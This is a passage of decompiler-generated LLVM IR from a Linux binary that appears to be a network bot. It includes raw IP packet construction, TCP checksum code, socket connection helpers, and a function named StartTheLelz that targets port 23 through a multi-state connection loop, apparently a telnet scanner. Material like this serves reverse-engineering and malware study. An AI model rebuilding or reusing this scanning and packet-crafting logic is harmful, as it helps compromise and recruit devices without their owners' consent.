  %v4_8049d4f21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_8049d5222 = udiv i32 %v4_8049d4c20, 65536
  %v4_8049d5223 = mul i32 %v4_8049d4f21, 65536
  %v5_8049d5224 = or i32 %v4_8049d5223, %v3_8049d5222
  %v2_8049d5625 = udiv i32 %v4_8049d4f21, 65536
  %v2_8049d5926 = or i32 %v5_8049d5224, %v2_8049d5625
  %v3_8049d5927 = icmp eq i32 %v2_8049d5926, 0
  %v1_8049d5d28 = icmp eq i1 %v3_8049d5927, false
  br i1 %v1_8049d5d28, label %dec_label_pc_8049d27, label %dec_label_pc_8049d5f

dec_label_pc_8049d27:                             ; preds = %dec_label_pc_8049d4c.preheader, %dec_label_pc_8049d27
  %v2_8049d5631 = phi i32 [ %v2_8049d56, %dec_label_pc_8049d27 ], [ %v2_8049d5625, %dec_label_pc_8049d4c.preheader ]
  %v5_8049d5230 = phi i32 [ %v5_8049d52, %dec_label_pc_8049d27 ], [ %v5_8049d5224, %dec_label_pc_8049d4c.preheader ]
  %v4_8049d4c29 = phi i32 [ %v4_8049d4c, %dec_label_pc_8049d27 ], [ %v4_8049d4c20, %dec_label_pc_8049d4c.preheader ]
  %v2_8049d42 = add i32 %v5_8049d5230, %v4_8049d4c29
  %v7_8049d42 = icmp ult i32 %v2_8049d42, %v4_8049d4c29
  %v3_8049d44 = zext i1 %v7_8049d42 to i32
  %v5_8049d44 = add nuw nsw i32 %v3_8049d44, %v2_8049d5631
  %sext = mul i32 %v2_8049d42, 65536
  %v4_8049d4c = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_8049d44, 65536
  %v4_8049d4f = sdiv i32 %sext50, 65536
  %v3_8049d52 = udiv i32 %v4_8049d4c, 65536
  %v5_8049d52 = or i32 %sext50, %v3_8049d52
  %v2_8049d56 = udiv i32 %v4_8049d4f, 65536
  %v2_8049d59 = or i32 %v5_8049d52, %v2_8049d56
  %v3_8049d59 = icmp eq i32 %v2_8049d59, 0
  %v1_8049d5d = icmp eq i1 %v3_8049d59, false
  br i1 %v1_8049d5d, label %dec_label_pc_8049d27, label %dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge

dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge: ; preds = %dec_label_pc_8049d27
  store i32 %v5_8049d5230, i32* @ecx, align 4
  br label %dec_label_pc_8049d5f

dec_label_pc_8049d5f:                             ; preds = %dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge, %dec_label_pc_8049d4c.preheader
  %v4_8049d4c.lcssa = phi i32 [ %v4_8049d4c, %dec_label_pc_8049d4c.dec_label_pc_8049d5f_crit_edge ], [ %v4_8049d4c20, %dec_label_pc_8049d4c.preheader ]
  %v1_8049d62 = urem i32 %v4_8049d4c.lcssa, 65536
  %v1_8049d64 = xor i32 %v1_8049d62, 65535
  store i32 %v0_8049cce, i32* @ebx, align 4
  ret i32 %v1_8049d64

; uselistorder directives
  uselistorder i32 %v5_8049d52, { 1, 0 }
  uselistorder i32 %v4_8049d4c, { 1, 0, 2 }
  uselistorder i32 %v2_8049d5625, { 1, 0 }
  uselistorder i32 %v4_8049d4f21, { 1, 0 }
  uselistorder i32 %v4_8049d4c20, { 2, 1, 0 }
  uselistorder i32 %v4_8049d1f, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_8049cf4.lcssa, { 1, 0 }
  uselistorder i32 %v4_8049d02, { 1, 0 }
  uselistorder i32 %v6_8049cf4, { 1, 2, 0 }
  uselistorder i32 %v4_8049cf4, { 1, 0 }
  uselistorder i32 %v6_8049ce5, { 1, 0 }
  uselistorder label %dec_label_pc_8049d27, { 1, 0 }
  uselistorder label %dec_label_pc_8049ce2, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_8049d85 = add i32 %tmp9, 12
  %v2_8049d85 = inttoptr i32 %v1_8049d85 to i32*
  %v3_8049d85 = load i32, i32* %v2_8049d85, align 4
  %v1_8049d8e = add i32 %tmp9, 16
  %v2_8049d8e = inttoptr i32 %v1_8049d8e to i32*
  %v3_8049d8e = load i32, i32* %v2_8049d8e, align 4
  %v1_8049da1 = call i32 @htons(i32 20)
  %v1_8049dbb = call i32 @malloc(i32 32)
  store i32 %v1_8049dbb, i32* %ecx.global-to-local, align 4
  %v2_8049dce = inttoptr i32 %v1_8049dbb to i32*
  store i32 %v3_8049d85, i32* %v2_8049dce, align 4
  %v1_8049dd3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049dd3 = add i32 %v1_8049dd3, 4
  %v3_8049dd3 = inttoptr i32 %v2_8049dd3 to i32*
  store i32 %v3_8049d8e, i32* %v3_8049dd3, align 4
  %v1_8049dd9 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049dd9 = add i32 %v1_8049dd9, 8
  %v3_8049dd9 = inttoptr i32 %v2_8049dd9 to i32*
  store i32 0, i32* %v3_8049dd9, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_8049de2 = add i32 %v1_8049dbb, 12
  store i32 %v1_8049de2, i32* %edx.global-to-local, align 4
  %v1_8049de5 = inttoptr i32 %tmp1 to i32*
  %v2_8049de5 = load i32, i32* %v1_8049de5, align 4
  %v2_8049de7 = inttoptr i32 %v1_8049de2 to i32*
  store i32 %v2_8049de5, i32* %v2_8049de7, align 4
  %v0_8049de9 = load i32, i32* @ecx, align 4
  %v1_8049de9 = add i32 %v0_8049de9, 4
  %v2_8049de9 = inttoptr i32 %v1_8049de9 to i32*
  %v3_8049de9 = load i32, i32* %v2_8049de9, align 4
  %v1_8049dec = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dec = add i32 %v1_8049dec, 4
  %v3_8049dec = inttoptr i32 %v2_8049dec to i32*
  store i32 %v3_8049de9, i32* %v3_8049dec, align 4
  %v0_8049def = load i32, i32* @ecx, align 4
  %v1_8049def = add i32 %v0_8049def, 8
  %v2_8049def = inttoptr i32 %v1_8049def to i32*
  %v3_8049def = load i32, i32* %v2_8049def, align 4
  %v1_8049df2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049df2 = add i32 %v1_8049df2, 8
  %v3_8049df2 = inttoptr i32 %v2_8049df2 to i32*
  store i32 %v3_8049def, i32* %v3_8049df2, align 4
  %v0_8049df5 = load i32, i32* @ecx, align 4
  %v1_8049df5 = add i32 %v0_8049df5, 12
  %v2_8049df5 = inttoptr i32 %v1_8049df5 to i32*
  %v3_8049df5 = load i32, i32* %v2_8049df5, align 4
  %v1_8049df8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049df8 = add i32 %v1_8049df8, 12
  %v3_8049df8 = inttoptr i32 %v2_8049df8 to i32*
  store i32 %v3_8049df5, i32* %v3_8049df8, align 4
  %v0_8049dfb = load i32, i32* @ecx, align 4
  %v1_8049dfb = add i32 %v0_8049dfb, 16
  %v2_8049dfb = inttoptr i32 %v1_8049dfb to i32*
  %v3_8049dfb = load i32, i32* %v2_8049dfb, align 4
  %v1_8049dfe = load i32, i32* %edx.global-to-local, align 4
  %v2_8049dfe = add i32 %v1_8049dfe, 16
  %v3_8049dfe = inttoptr i32 %v2_8049dfe to i32*
  store i32 %v3_8049dfb, i32* %v3_8049dfe, align 4
  %v2_8049e07 = inttoptr i32 %v1_8049dbb to i16*
  %v3_8049e07 = call i32 @csum(i16* %v2_8049e07, i32 32)
  %v1_8049e19 = call i32 @free(i32 %v1_8049dbb)
  %v4_8049e21 = urem i32 %v3_8049e07, 65536
  ret i32 %v4_8049e21

; uselistorder directives
  uselistorder i32 %v1_8049dbb, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_8049e2c = load i32, i32* @ebp, align 4
  store i32 %v0_8049e2c, i32* %stack_var_-4, align 4
  %v4_8049e32 = sext i8 %tmp8 to i32
  %v4_8049e38 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_8049e55 = add i32 %v4_8049e38, 1
  %v2_8049e55 = inttoptr i32 %v1_8049e55 to i8*
  store i8 0, i8* %v2_8049e55, align 1
  %v1_8049e5c = add i32 %tmp5, 20
  %v1_8049e62 = trunc i32 %v1_8049e5c to i16
  %v3_8049e62 = add i32 %v4_8049e38, 2
  %v4_8049e62 = inttoptr i32 %v3_8049e62 to i16*
  store i16 %v1_8049e62, i16* %v4_8049e62, align 2
  %v2_8049e66 = call i32 @rand_cmwc(i32 %v4_8049e32)
  %v1_8049e70 = trunc i32 %v2_8049e66 to i16
  %v3_8049e70 = add i32 %v4_8049e38, 4
  %v4_8049e70 = inttoptr i32 %v3_8049e70 to i16*
  store i16 %v1_8049e70, i16* %v4_8049e70, align 2
  %v1_8049e77 = add i32 %v4_8049e38, 6
  %v2_8049e77 = inttoptr i32 %v1_8049e77 to i16*
  store i16 0, i16* %v2_8049e77, align 2
  %v1_8049e80 = add i32 %v4_8049e38, 8
  %v2_8049e80 = inttoptr i32 %v1_8049e80 to i8*
  store i8 -1, i8* %v2_8049e80, align 1
  %v3_8049e8a = add i32 %v4_8049e38, 9
  %v4_8049e8a = inttoptr i32 %v3_8049e8a to i8*
  store i8 %tmp8, i8* %v4_8049e8a, align 1
  %v1_8049e90 = add i32 %v4_8049e38, 10
  %v2_8049e90 = inttoptr i32 %v1_8049e90 to i16*
  store i16 0, i16* %v2_8049e90, align 2
  %v2_8049e9c = add i32 %v4_8049e38, 12
  %v3_8049e9c = inttoptr i32 %v2_8049e9c to i32*
  %v2_8049ea5 = add i32 %v4_8049e38, 16
  %v3_8049ea5 = inttoptr i32 %v2_8049ea5 to i32*
  store i32 %tmp, i32* %v3_8049ea5, align 4
  %v2_8049ea8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049ea8, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 1, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_8049eb0 = add i32 %arg1, -2
  %v9_8049eb0 = sub i32 1, %arg1
  %v10_8049eb0 = and i32 %v9_8049eb0, %arg1
  %v11_8049eb0 = icmp slt i32 %v10_8049eb0, 0
  %v12_8049eb0 = icmp eq i32 %v4_8049eb0, 0
  %v13_8049eb0 = icmp slt i32 %v4_8049eb0, 0
  %v3_8049eb4 = icmp eq i1 %v13_8049eb0, %v11_8049eb0
  %v4_8049eb4 = icmp eq i1 %v12_8049eb0, false
  %v5_8049eb4 = and i1 %v4_8049eb4, %v3_8049eb4
  br i1 %v5_8049eb4, label %dec_label_pc_8049ebf, label %dec_label_pc_8049ed4

dec_label_pc_8049ebf:                             ; preds = %entry
  %v1_8049ec5 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_8049ed4

dec_label_pc_8049ed4:                             ; preds = %entry, %dec_label_pc_8049ebf
  %storemerge = phi i32 [ 0, %dec_label_pc_8049ebf ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049eb0, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8049ed4, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_8049ef3 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8049efe = icmp eq i32 %v1_8049ef3, 0
  %v1_8049f02 = icmp eq i1 %v4_8049efe, false
  br i1 %v1_8049f02, label %dec_label_pc_8049f10, label %dec_label_pc_8049f04

dec_label_pc_8049f04:                             ; preds = %entry
  br label %dec_label_pc_8049fb5

dec_label_pc_8049f10:                             ; preds = %entry
  %v1_8049f13 = add i32 %v1_8049ef3, 12
  %v2_8049f13 = inttoptr i32 %v1_8049f13 to i32*
  %v3_8049f13 = load i32, i32* %v2_8049f13, align 4
  %v1_8049f1b = add i32 %v1_8049ef3, 16
  %v2_8049f1b = inttoptr i32 %v1_8049f1b to i32*
  %v3_8049f1b = load i32, i32* %v2_8049f1b, align 4
  %v1_8049f1e = inttoptr i32 %v3_8049f1b to i32*
  %v2_8049f1e = load i32, i32* %v1_8049f1e, align 4
  %v15_8049f27 = ptrtoint i32* %stack_var_-24 to i32
  %v3_8049f2c = call i32 @bcopy(i32 %v2_8049f1e, i32 %v15_8049f27, i32 %v3_8049f13)
  %v1_8049f372 = zext i16 %arg2 to i32
  %v1_8049f40 = call i32 @htons(i32 %v1_8049f372)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_8049f5b = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_8049f66 = ptrtoint i32* %stack_var_-32 to i32
  %v5_8049f76 = call i32 @__GI_setsockopt(i32 %v3_8049f5b, i32 6, i32 1, i32 %v2_8049f66, i32 4)
  %v13_8049f7e = icmp eq i32 %v3_8049f5b, -1
  %v1_8049f82 = icmp eq i1 %v13_8049f7e, false
  br i1 %v1_8049f82, label %dec_label_pc_8049f8d, label %dec_label_pc_8049f84

dec_label_pc_8049f84:                             ; preds = %dec_label_pc_8049f10
  br label %dec_label_pc_8049fb5

dec_label_pc_8049f8d:                             ; preds = %dec_label_pc_8049f10
  %v2_8049f24 = ptrtoint i32* %stack_var_-28 to i32
  %v3_8049f99 = call i32 @__libc_connect(i32 %v3_8049f5b, i32 %v2_8049f24, i32 16)
  %v10_8049fa1 = icmp eq i32 %v3_8049f99, -1
  %v1_8049fa4 = icmp eq i1 %v10_8049fa1, false
  br i1 %v1_8049fa4, label %dec_label_pc_8049faf, label %dec_label_pc_8049fa6

dec_label_pc_8049fa6:                             ; preds = %dec_label_pc_8049f8d
  br label %dec_label_pc_8049fb5

dec_label_pc_8049faf:                             ; preds = %dec_label_pc_8049f8d
  br label %dec_label_pc_8049fb5

dec_label_pc_8049fb5:                             ; preds = %dec_label_pc_8049fa6, %dec_label_pc_8049f84, %dec_label_pc_8049f04, %dec_label_pc_8049faf
  %v3_8049fb5 = phi i32 [ 0, %dec_label_pc_8049fa6 ], [ 0, %dec_label_pc_8049f84 ], [ 0, %dec_label_pc_8049f04 ], [ %v3_8049f5b, %dec_label_pc_8049faf ]
  ret i32 %v3_8049fb5

; uselistorder directives
  uselistorder i32 %v3_8049f5b, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_8049fb5, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_8049fc0 = ptrtoint i32* %stack_var_-636 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8049fd1 = call i32 @__GI_time(i32* null)
  store i32 %v2_8049fd1, i32* %eax.global-to-local, align 4
  store i32 %v2_8049fd1, i32* @ebx, align 4
  %v1_8049fdb = call i32 @rand_cmwc(i32 0)
  %v1_8049fe0 = load i32, i32* @ebx, align 4
  %v2_8049fe0 = xor i32 %v1_8049fe0, %v1_8049fdb
  store i32 %v2_8049fe0, i32* @eax, align 4
  %v1_8049fe6 = call i32 @srand(i32 %v2_8049fe0)
  store i32 %v1_8049fe6, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_8049ffc = call i32 @htons(i32 23)
  %v2_804a00b = ptrtoint i32* %stack_var_-604 to i32
  %v15_804a011 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804a011, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804a029 = call i32 @malloc(i32 1025)
  store i32 %v1_804a029, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804a045 = inttoptr i32 %v1_804a029 to i8*
  %v4_804a045 = call i32 @__GI_memset(i8* %v3_804a045, i32 0, i32 1025)
  %v2_804a05e = mul i32 %arg2, 28
  %v1_804a063 = add i32 %v2_804a05e, 30
  %v2_804a066 = and i32 %v1_804a063, -16
  %v2_804a06c = sub i32 %v15_8049fc0, %v2_804a066
  %v1_804a07a = add i32 %v2_804a06c, 15
  %v2_804a07d = and i32 %v1_804a07a, -16
  %v2_804a09a = mul i32 %arg2, 5
  store i32 %v2_804a09a, i32* %edx.global-to-local, align 4
  %v1_804a0a0 = inttoptr i32 %v2_804a07d to i8*
  store i32 %v2_804a07d, i32* @edi, align 4
  %v1_804a0a5 = and i32 %v1_804a07a, -256
  store i32 %v1_804a0a5, i32* %eax.global-to-local, align 4
  %v5_804a0a7 = call i8* @_memset(i8* %v1_804a0a0, i32 %v1_804a0a5, i32 %v2_804a09a)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a13450 = icmp sgt i32 %arg2, 0
  br i1 %v5_804a13450, label %dec_label_pc_804a0b2.lr.ph, label %dec_label_pc_804a141

dec_label_pc_804a0b2.lr.ph:                       ; preds = %entry
  %v2_804a106 = or i32 %v2_804a07d, 9
  br label %dec_label_pc_804a0b2

dec_label_pc_804a0b2:                             ; preds = %dec_label_pc_804a0b2, %dec_label_pc_804a0b2.lr.ph
  %storemerge251 = phi i32 [ 0, %dec_label_pc_804a0b2.lr.ph ], [ %v4_804a12b, %dec_label_pc_804a0b2 ]
  %v2_804a0c6 = mul i32 %storemerge251, 28
  %v2_804a0c8 = add i32 %v2_804a0c6, %v2_804a07d
  store i32 %v2_804a0c8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a0d0 = inttoptr i32 %v2_804a0c8 to i32*
  store i32 0, i32* %v2_804a0d0, align 4
  %v0_804a0d2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d2 = add i32 %v0_804a0d2, 4
  store i32 %v1_804a0d2, i32* %eax.global-to-local, align 4
  %v0_804a0d5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0d5 = inttoptr i32 %v1_804a0d2 to i32*
  store i32 %v0_804a0d5, i32* %v2_804a0d5, align 4
  %v0_804a0d7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d7 = add i32 %v0_804a0d7, 4
  store i32 %v1_804a0d7, i32* %eax.global-to-local, align 4
  %v0_804a0da = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0da = inttoptr i32 %v1_804a0d7 to i32*
  store i32 %v0_804a0da, i32* %v2_804a0da, align 4
  %v0_804a0dc = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0dc = add i32 %v0_804a0dc, 4
  store i32 %v1_804a0dc, i32* %eax.global-to-local, align 4
  %v0_804a0df = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0df = inttoptr i32 %v1_804a0dc to i32*
  store i32 %v0_804a0df, i32* %v2_804a0df, align 4
  %v0_804a0e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e1 = add i32 %v0_804a0e1, 4
  store i32 %v1_804a0e1, i32* %eax.global-to-local, align 4
  %v0_804a0e4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e4 = inttoptr i32 %v1_804a0e1 to i32*
  store i32 %v0_804a0e4, i32* %v2_804a0e4, align 4
  %v0_804a0e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e6 = add i32 %v0_804a0e6, 4
  store i32 %v1_804a0e6, i32* %eax.global-to-local, align 4
  %v0_804a0e9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e9 = inttoptr i32 %v1_804a0e6 to i32*
  store i32 %v0_804a0e9, i32* %v2_804a0e9, align 4
  %v0_804a0eb = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0eb = add i32 %v0_804a0eb, 4
  %v0_804a0ee = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0ee = inttoptr i32 %v1_804a0eb to i32*
  store i32 %v0_804a0ee, i32* %v2_804a0ee, align 4
  %v3_804a106 = add i32 %v2_804a106, %v2_804a0c6
  %v4_804a106 = inttoptr i32 %v3_804a106 to i8*
  store i8 1, i8* %v4_804a106, align 1
  %v1_804a123 = add i32 %v2_804a0c8, 24
  store i32 %v1_804a123, i32* %edx.global-to-local, align 4
  %v2_804a129 = inttoptr i32 %v1_804a123 to i32*
  store i32 %v1_804a029, i32* %v2_804a129, align 4
  %v4_804a12b = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804a12b, i32* %eax.global-to-local, align 4
  %exitcond52 = icmp eq i32 %v4_804a12b, %arg2
  br i1 %exitcond52, label %dec_label_pc_804a141, label %dec_label_pc_804a0b2

dec_label_pc_804a141:                             ; preds = %entry, %dec_label_pc_804a0b2, %dec_label_pc_804a141
  %stack_var_-48.0 = phi i32 [ %v4_804a141, %dec_label_pc_804a141 ], [ 0, %dec_label_pc_804a0b2 ], [ 0, %entry ]
  %v4_804a141 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804a141, i32* %eax.global-to-local, align 4
  %v1_804a147 = mul i32 %v4_804a141, 4
  %v2_804a147 = add i32 %v1_804a147, ptrtoint ([10 x i8*]* @global_var_80597a0.52 to i32)
  %v3_804a147 = inttoptr i32 %v2_804a147 to i32*
  %v4_804a147 = load i32, i32* %v3_804a147, align 4
  store i32 %v4_804a147, i32* %eax.global-to-local, align 4
  %v1_804a14e = icmp eq i32 %v4_804a147, 0
  %v1_804a150 = icmp eq i1 %v1_804a14e, false
  br i1 %v1_804a150, label %dec_label_pc_804a141, label %dec_label_pc_804a152.preheader

dec_label_pc_804a152.preheader:                   ; preds = %dec_label_pc_804a141
  %v2_804a52a = ptrtoint i32* %stack_var_-316 to i32
  %tmp38 = bitcast i32* %stack_var_-316 to i8*
  %v2_804a5ad = ptrtoint i32* %stack_var_-324 to i32
  %v2_804a605 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804a60c = ptrtoint i32* %stack_var_-332 to i32
  %v2_804a1c3 = or i32 %v2_804a07d, 8
  %v2_804a206 = or i32 %v2_804a07d, 9
  %v2_804a2f5 = or i32 %v2_804a07d, 11
  %v2_804a32f = or i32 %v2_804a07d, 10
  %v2_804acec = add i32 %v2_804a07d, 16
  br label %dec_label_pc_804a152

dec_label_pc_804a152:                             ; preds = %dec_label_pc_804a152, %dec_label_pc_804b063, %dec_label_pc_804a152.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804a152.preheader ], [ %stack_var_-624.0, %dec_label_pc_804a152 ], [ %stack_var_-624.1, %dec_label_pc_804b063 ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804a152.preheader ], [ %stack_var_-620.0, %dec_label_pc_804a152 ], [ %stack_var_-620.1, %dec_label_pc_804b063 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804a13450, label %dec_label_pc_804a15e, label %dec_label_pc_804a152

dec_label_pc_804a15e:                             ; preds = %dec_label_pc_804a152, %dec_label_pc_804b063
  %storemerge45 = phi i32 [ %v4_804b063, %dec_label_pc_804b063 ], [ 0, %dec_label_pc_804a152 ]
  %stack_var_-620.244 = phi i32 [ %stack_var_-620.1, %dec_label_pc_804b063 ], [ %stack_var_-620.0, %dec_label_pc_804a152 ]
  %stack_var_-624.243 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804b063 ], [ %stack_var_-624.0, %dec_label_pc_804a152 ]
  %v1_804a164 = mul i32 %storemerge45, 4
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  %v2_804a172 = mul i32 %storemerge45, 28
  %v2_804a174 = add i32 %v2_804a172, %v2_804a07d
  %v1_804a176 = add i32 %v2_804a174, 16
  store i32 %v1_804a176, i32* %eax.global-to-local, align 4
  %v1_804a179 = inttoptr i32 %v1_804a176 to i32*
  %v2_804a179 = load i32, i32* %v1_804a179, align 4
  store i32 %v2_804a179, i32* %eax.global-to-local, align 4
  %v1_804a17b = icmp eq i32 %v2_804a179, 0
  %v1_804a17d = icmp eq i1 %v1_804a17b, false
  br i1 %v1_804a17d, label %dec_label_pc_804a1ad, label %dec_label_pc_804a17f

dec_label_pc_804a17f:                             ; preds = %dec_label_pc_804a15e
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804a182 = load i32, i32* @esp, align 4
  %v1_804a185 = add i32 %v0_804a182, -16
  %v2_804a185 = inttoptr i32 %v1_804a185 to i32*
  store i32 0, i32* %v2_804a185, align 4
  %v1_804a187 = inttoptr i32 %storemerge45 to i32*
  %v2_804a187 = call i32 @__GI_time(i32* %v1_804a187)
  store i32 %v2_804a187, i32* @esi, align 4
  %v0_804a194 = load i32, i32* @ebx, align 4
  %v1_804a196 = mul i32 %v0_804a194, 4
  store i32 %v1_804a196, i32* %edx.global-to-local, align 4
  %v2_804a1a4 = mul i32 %v0_804a194, 28
  %v2_804a1a6 = add i32 %v2_804a1a4, %v2_804a07d
  %v1_804a1a8 = add i32 %v2_804a1a6, 16
  store i32 %v1_804a1a8, i32* %eax.global-to-local, align 4
  %v2_804a1ab = inttoptr i32 %v1_804a1a8 to i32*
  store i32 %v2_804a187, i32* %v2_804a1ab, align 4
  br label %dec_label_pc_804a1ad

dec_label_pc_804a1ad:                             ; preds = %dec_label_pc_804a15e, %dec_label_pc_804a17f
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a1c3 = add i32 %v2_804a1c3, %v2_804a172
  %v4_804a1c3 = inttoptr i32 %v3_804a1c3 to i8*
  %v5_804a1c3 = load i8, i8* %v4_804a1c3, align 4
  %v6_804a1c3 = zext i8 %v5_804a1c3 to i32
  %v8_804a1c3 = and i32 %v2_804a172, -256
  %v9_804a1c3 = or i32 %v6_804a1c3, %v8_804a1c3
  store i32 %v9_804a1c3, i32* %eax.global-to-local, align 4
  store i32 %v6_804a1c3, i32* %edx.global-to-local, align 4
  store i32 %v6_804a1c3, i32* @edi, align 4
  %v1_804a1e7 = mul nuw nsw i32 %v6_804a1c3, 4
  %v2_804a1e7 = add nuw nsw i32 %v1_804a1e7, 134570536
  %v3_804a1e7 = inttoptr i32 %v2_804a1e7 to i32*
  %v4_804a1e7 = load i32, i32* %v3_804a1e7, align 4
  store i32 %v4_804a1e7, i32* %eax.global-to-local, align 4
  switch i8 %v5_804a1c3, label %dec_label_pc_804b063 [
    i8 0, label %dec_label_pc_804a1f0
    i8 1, label %dec_label_pc_804a520
    i8 2, label %dec_label_pc_804a765
    i8 3, label %dec_label_pc_804a8a1
    i8 4, label %dec_label_pc_804a9e9
    i8 5, label %dec_label_pc_804ab25
    i8 6, label %dec_label_pc_804ac6d
    i8 7, label %dec_label_pc_804af07
  ]

dec_label_pc_804a1f0:                             ; preds = %dec_label_pc_804a1ad
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  %v3_804a206 = add i32 %v2_804a206, %v2_804a172
  %v4_804a206 = inttoptr i32 %v3_804a206 to i8*
  %v5_804a206 = load i8, i8* %v4_804a206, align 1
  %v10_804a20a = icmp eq i8 %v5_804a206, 1
  %v1_804a20c = icmp eq i1 %v10_804a20a, false
  store i32 %v1_804a164, i32* %edx.global-to-local, align 4
  store i32 %v2_804a172, i32* %eax.global-to-local, align 4
  br i1 %v1_804a20c, label %dec_label_pc_804a2bb, label %dec_label_pc_804a212

dec_label_pc_804a212:                             ; preds = %dec_label_pc_804a1f0
  %v1_804a22a = add i32 %v2_804a174, 24
  store i32 %v1_804a22a, i32* %eax.global-to-local, align 4
  %v1_804a22d = inttoptr i32 %v1_804a22a to i32*
  %v2_804a22d = load i32, i32* %v1_804a22d, align 4
  store i32 %v2_804a174, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a250 = inttoptr i32 %v2_804a174 to i32*
  store i32 0, i32* %v2_804a250, align 4
  %v0_804a252 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a252 = add i32 %v0_804a252, 4
  store i32 %v1_804a252, i32* %eax.global-to-local, align 4
  %v0_804a255 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a255 = inttoptr i32 %v1_804a252 to i32*
  store i32 %v0_804a255, i32* %v2_804a255, align 4
  %v0_804a257 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a257 = add i32 %v0_804a257, 4
  store i32 %v1_804a257, i32* %eax.global-to-local, align 4
  %v0_804a25a = load i32, i32* %edx.global-to-local, align 4
  %v2_804a25a = inttoptr i32 %v1_804a257 to i32*
  store i32 %v0_804a25a, i32* %v2_804a25a, align 4
  %v0_804a25c = load i32, i32* %eax.global-to-local, align 4
